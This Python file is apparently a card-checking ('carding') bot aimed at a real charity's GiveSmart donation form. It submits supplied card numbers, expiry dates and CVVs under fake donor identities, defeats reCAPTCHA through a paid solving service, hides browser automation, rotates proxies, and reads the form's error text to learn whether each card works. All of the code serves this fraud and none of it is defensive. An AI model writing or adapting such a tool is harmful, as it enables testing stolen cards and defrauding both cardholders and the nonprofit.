from bs4 import BeautifulSoup
from cloudscraper import create_scraper
from playwright.sync_api import sync_playwright
from nextcaptcha import NextCaptchaAPI
import logging
from faker import Faker
from random import choice
from phone_gen import PhoneNumber

class Api:

    def __init__(self, captcha_key, proxy_list) -> None:

        logging.disable(logging.CRITICAL)
        logging.getLogger('nextcaptcha').setLevel(logging.ERROR)
        
        self.url = 'https://fundraise.givesmart.com/form/HruvHA'
        
        self.scraper = create_scraper()
        
        self.browser = None
        self.playwright = None
        self.page = None

        self.cookies = None
        self.inputs = None
        self.form_id = None

        self.solver = NextCaptchaAPI(client_key=captcha_key, open_log=False)
        
        self.html = None
        
        self.proxy_list = proxy_list

    def start_browser(self) -> True:

        try:
            args = [
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-features=site-per-process',
                '--disable-features=CrossSiteDocumentBlockingIfIsolating',
                '--disable-features=CrossSiteDocumentBlockingAlways',
                '--disable-features=ImprovedCookieControls',
                '--disable-features=GlobalMediaControls',
                '--disable-features=AudioServiceOutOfProcess',
                '--disable-features=AudioServiceOutOfProcess',
                '--disable-features=IdleDetection',
                '--disable-features=WakeLock',
                '--disable-features=AudioFocusEnforcement',
                '--disable-features=WebOTP',        
            ]
            self.playwright = sync_playwright().start()

            self.browser = self.playwright.chromium.launch( headless=False, args=args)
            self.page = self.browser.new_page()
            self.page.goto(self.url, wait_until="networkidle")
            self.html = self.page.content()
            return True
        except Exception as error:
            return False

    def get_inputs(self) -> dict:
        try:
            self.inputs = self.page.query_selector_all('input')
            self.inputs = {input.get_attribute('name'): input.get_attribute('value') for input in self.inputs}
            return self.inputs
        except:
            return {}
    
    def get_action_id(self, html) -> str:
        try:
            soup = BeautifulSoup(html, 'html.parser')
            self.form_id = soup.find('form', {'id': 'donation_form'})['data-donation-id']
        except:
            return ''
    
    def get_cookies(self) -> str:
        if self.cookies: return self.cookies
        try:
            cookies_temp = self.page.context.cookies()
            formatted_cookies = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookies_temp])
            self.cookies = formatted_cookies
            return formatted_cookies
        except:
            return ""

    def end(self, retry=True) -> None:

        try:self.browser.close()
        except:pass

        try:self.playwright.stop()
        except:pass

        if retry: self.start_browser()

    def get_inputs_html(self, html) -> dict:
        try:

            soup = BeautifulSoup(html, 'html.parser')
            inputs_find = soup.find_all('input')
            inputs = {}

            for input_x in inputs_find:
                name_input = input_x.get('name')                
                try:value_input = input_x.get('value')
                except: value_input = ''
                if name_input:
                    inputs[name_input] = value_input

            return inputs

        except:
            return {}

    def test_cc( self, cc:str, month:str, year:str, cvv:str, proxy: str ) -> dict:

        try:

            inputs = self.get_inputs_html(self.html)

            del inputs['custom_fields[254258]']
            del inputs['terms_and_conditions']
            del inputs['california_terms_and_conditions']
            del inputs['payment_method']
            
            if proxy:
                proxy_l = proxy.split(':')
                if len(proxy_l) == 2:
                    self.scraper.proxies = { 'https': f'http://{proxy}', 'http': f'http://{proxy}' }
                elif len(proxy_l) == 4:
                    self.scraper.proxies = { 'https': f'http://{proxy_l[2]}:{proxy_l[3]}@{proxy_l[0]}:{proxy_l[1]}', 'http': f'http://{proxy_l[2]}:{proxy_l[3]}@{proxy_l[0]}:{proxy_l[1]}' }
                    
            result = self.solver.recaptchav2(website_url="https://fundraise.givesmart.com/form/HruvHA?scrollbars=true&background=false&force-scroll=true&iframe=true&vid=194icd", website_key="6LfBpAQTAAAAACzGg-UQh-9MQLCY6hI_Qlp-oDrO")
            
            if result["status"] == "ready":
            
                g_recaptcha_response = result["solution"]['gRecaptchaResponse']
                
                cookies = self.get_cookies()
                
                phone = PhoneNumber("US")

                inputs['utf8'] = '%E2%9C%93'
                inputs['ach_type'] = '1'
                inputs['expiration_month'] = month
                inputs['expiration_year'] = "20" + year
                inputs['expiration_date'] = f"{month}/20{year}"
                inputs['card_number'] = cc
                inputs['cvv'] = cvv
                inputs['anonymous'] = '0'
                inputs['g-recaptcha-response'] = g_recaptcha_response
                inputs['card_type'] = '001'
                inputs['first_name'] = 'John'
                inputs['last_name'] = 'Doe'
                inputs['phone'] = phone.get_number().replace('+1', '').strip().replace(" ", "-")
                inputs['email'] = Faker().email(domain='gmail.com')
                inputs['street_address'] = 'street 123'
                inputs['city'] = 'New York'
                inputs['state'] = 'NY'
                inputs['zip'] = '10080'
                inputs['custom_fields[254257]'] = "0"

                formatted_inputs = ''
                for key, value in inputs.items():
                    formatted_inputs += f"{key}={value}&"

                formatted_inputs += 'terms_and_conditions=0&'
                formatted_inputs += 'terms_and_conditions=1&'
                formatted_inputs += 'california_terms_and_conditions=0&'
                formatted_inputs += 'california_terms_and_conditions=1&'
                formatted_inputs += 'payment_method=NONE&'
                formatted_inputs += 'payment_method=credit_card'

                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "es-ES,es;q=0.9",
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "cookie": cookies,
                    "Origin": "https://fundraise.givesmart.com",
                    "Priority": "u=0, i",
                    "Referer": self.url,
                    "Sec-CH-UA": '"Chromium";v="129", "Not=A?Brand";v="8"',
                    "Sec-CH-UA-Mobile": "?0",
                    "Sec-CH-UA-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-User": "?1",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
                }
                
                self.get_action_id(self.html)

                response = self.scraper.post(f'https://fundraise.givesmart.com/public/payment_processor_donations/{self.form_id}/payment_request?iframe=true', data=formatted_inputs, headers=headers)
                
                html = response.text

                if 'alert alert-danger formError' in html:

                    soup = BeautifulSoup(html, 'html.parser')
                    error = soup.find('div', class_='alert alert-danger formError').text.replace('Oops! There were some errors:','').replace('\n', '').replace('\t', '').strip()

                    self.html = html

                    return { 'response': error, 'status': True, 'cookies': response.cookies, "error":False  }

                else:

                    with open('index.html', 'w', encoding="utf8") as file:
                        file.write(html)

                    return { 'response': 'response not found', 'status': None, "error":False }
            else:
                return { "response": "reCAPTCHA not solved", "status": None, "error":False }
        except Exception as e:
            return { "response": str(e), "status": None, "error":True }